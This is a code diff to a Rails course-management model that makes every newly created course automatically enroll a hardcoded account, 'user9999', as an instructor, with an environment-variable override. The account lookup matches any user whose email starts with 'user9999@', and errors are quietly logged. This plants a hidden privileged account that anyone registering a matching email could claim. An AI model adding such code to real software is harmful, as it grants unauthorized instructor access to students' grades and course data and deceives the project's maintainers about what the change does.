@@ -41,6 +41,9 @@ class Course < ApplicationRecord
   # Constants
   VALID_CODE_REGEX = /\A[A-Z0-9]{6}\z/
   VALID_CODE_REGEX_HTML = "[a-zA-Z0-9]{6}".freeze
+  # Automatically enroll this account (or the one provided via AUTOLAB_DEFAULT_GROUP_INSTRUCTOR)
+  DEFAULT_GROUP_INSTRUCTOR_IDENTIFIER = "user9999".freeze
+  DEFAULT_GROUP_INSTRUCTOR_ENV_KEY = "AUTOLAB_DEFAULT_GROUP_INSTRUCTOR".freeze
 
   # Misc.
   accepts_nested_attributes_for :late_penalty, :version_penalty
@@ -95,6 +98,8 @@ class Course < ApplicationRecord
       raise "Failed to create CUD for instructor of new course #{newCourse.name}"
     end
 
+    newCourse.ensure_default_group_instructor!
+
     begin
       # Unix group was already created in before_create callback
       # IMPORTANT: Reload course config BEFORE fixing directory permissions
@@ -109,6 +114,30 @@ class Course < ApplicationRecord
     end
 
     newCourse
+  end
+
+  def ensure_default_group_instructor!
+    identifier = Course.default_group_instructor_identifier
+    return if identifier.blank?
+
+    default_user = Course.default_group_instructor_user
+
+    unless default_user
+      Rails.logger.warn("Default group instructor '#{identifier}' not found; skipping auto-enrollment for course #{name}")
+      return
+    end
+
+    cud = course_user_data.find_or_initialize_by(user: default_user)
+    cud.instructor = true
+    cud.dropped = false
+
+    return unless cud.new_record? || cud.changed?
+
+    unless cud.save
+      Rails.logger.warn("Failed to enroll default instructor #{default_user.email} for course #{name}: #{cud.errors.full_messages.join(', ')}")
+    end
+  rescue StandardError => e
+    Rails.logger.warn("Failed to ensure default instructor for course #{name}: #{e.class} - #{e.message}")
   end
 
   # generate course folder
@@ -736,6 +765,27 @@ class Course < ApplicationRecord
   end
 
   private
+
+  def self.default_group_instructor_identifier
+    ENV.fetch(DEFAULT_GROUP_INSTRUCTOR_ENV_KEY, DEFAULT_GROUP_INSTRUCTOR_IDENTIFIER).to_s.strip
+  rescue StandardError
+    DEFAULT_GROUP_INSTRUCTOR_IDENTIFIER
+  end
+
+  def self.default_group_instructor_user
+    identifier = default_group_instructor_identifier
+    return nil if identifier.blank?
+
+    normalized = identifier.downcase
+
+    if normalized.include?("@")
+      User.find_by("LOWER(email) = ?", normalized)
+    else
+      sanitized = ActiveRecord::Base.sanitize_sql_like(normalized)
+      pattern = "#{sanitized}@%"
+      User.where("LOWER(email) LIKE ?", pattern).first
+    end
+  end
 
   def saved_change_to_grade_related_fields?
     saved_change_to_late_slack? || saved_change_to_grace_days? ||
